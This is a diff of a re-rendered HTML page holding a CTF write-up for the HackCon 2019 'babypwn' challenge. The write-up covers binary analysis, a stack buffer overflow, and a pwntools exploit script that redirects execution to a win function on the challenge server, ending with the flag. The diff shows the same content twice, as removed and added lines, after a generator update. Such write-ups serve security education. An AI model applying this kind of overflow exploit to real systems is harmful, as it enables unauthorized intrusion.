@@ -68,7 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.92.2" />
+ <meta name="generator" content="Hugo 0.98.0" />
         
 
         
@@ -158,39 +158,39 @@
 <p>You don’t need eip control for every pwn.</p>
 </blockquote>
 <p>You can download the binary <a href="/ctf/hackcon2019/binary/babypwn">here</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum ./babypwn
-57b32556465e890bdefdcccd6e515f6a2888300f48e9b7a7df0bb66694bda45b  babypwn
-</code></pre></div><h1 id="exploitation">Exploitation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum ./babypwn
+</span></span><span style="display:flex;"><span>57b32556465e890bdefdcccd6e515f6a2888300f48e9b7a7df0bb66694bda45b  babypwn
+</span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>The program asks five input, echoes them back and prints a message of failure. However there is a <code>segfault</code> caused by a buffer overflow.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./babypwn
-<span style="color:#ae81ff">1</span>
-<span style="color:#ae81ff">2</span>
-<span style="color:#ae81ff">3</span>
-<span style="color:#ae81ff">4</span>
-<span style="color:#ae81ff">5</span>
-<span style="color:#ae81ff">1</span>
-
-<span style="color:#ae81ff">2</span>
-
-<span style="color:#ae81ff">3</span>
-
-<span style="color:#ae81ff">4</span>
-
-<span style="color:#ae81ff">5</span>
-
-Naaa  , Try HArder
-
-$ ./babypwn
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
-
-$ checksec ./babypwn
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
-</code></pre></div><p>I opened with r2 and there are two interesting functions: <code>win</code> and <code>nope</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./babypwn
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Naaa  , Try HArder
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ./babypwn
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ checksec ./babypwn
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I opened with r2 and there are two interesting functions: <code>win</code> and <code>nope</code>.
 The former prints the flag, the latter prints: <em>Naaa , Try HArder.</em></p>
 <p><img src="/ctf/hackcon2019/images/babypwn-win-nope.jpg" alt="The win and nope function"></p>
 <p>The address of the <code>nope</code> function is inserted at <code>var_40h</code>, in the first block of the <code>main</code> function</p>
@@ -205,33 +205,33 @@ Specifically our input will be copied to <code>var_30h + var_44h*8</code>.
 So, because the offset between the <code>saved EIP</code> and <code>var_30h</code> is 56, if <code>[var_44h]</code> is 7 we can overwrite the <code>saved EIP</code> with the <code>strncpy</code> and pwn the program.</p>
 <p>This is the exploit:</p>
 <p><em>Incidentally (maybe voluntarily) the payload length is 16. So the <code>lsb</code> of <code>[var_40h]</code> is overwritten with 0x00. The new address (<code>0x00400800</code>) points to a ret. So it just works.</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-
-<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
-	host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;68.183.158.95&#34;</span>
-	port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8990</span>
-	t <span style="color:#f92672">=</span> remote(host, port)
-<span style="color:#66d9ef">else</span>:
-	t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
-
-offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
-payload <span style="color:#f92672">=</span> p64(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])  <span style="color:#75715e">#var_50h</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset               <span style="color:#75715e">#var_48h</span>
-payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x7</span>)                 <span style="color:#75715e">#var_44h</span>
-
-t<span style="color:#f92672">.</span>sendline(payload)
-t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Yay , Here&#39;s the flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-print t<span style="color:#f92672">.</span>recvline()
-t<span style="color:#f92672">.</span>close()
-</code></pre></div><p>Here’s the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py <span style="color:#ae81ff">1</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8990: Done
-d4rk<span style="color:#f92672">{</span>B0fs_4r3_3zzzz<span style="color:#f92672">}</span>c0de
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 68.183.158.95 port <span style="color:#ae81ff">8990</span>
-</code></pre></div><p><img src="/ctf/hackcon2019/images/babypwn-solved.jpg" alt="babypwn solved banner"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>	host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;68.183.158.95&#34;</span>
+</span></span><span style="display:flex;"><span>	port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8990</span>
+</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])  <span style="color:#75715e">#var_50h</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset               <span style="color:#75715e">#var_48h</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x7</span>)                 <span style="color:#75715e">#var_44h</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Yay , Here&#39;s the flag</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print t<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>Here’s the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8990: Done
+</span></span><span style="display:flex;"><span>d4rk<span style="color:#f92672">{</span>B0fs_4r3_3zzzz<span style="color:#f92672">}</span>c0de
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 68.183.158.95 port <span style="color:#ae81ff">8990</span>
+</span></span></code></pre></div><p><img src="/ctf/hackcon2019/images/babypwn-solved.jpg" alt="babypwn solved banner"></p>
 </div>
 
     
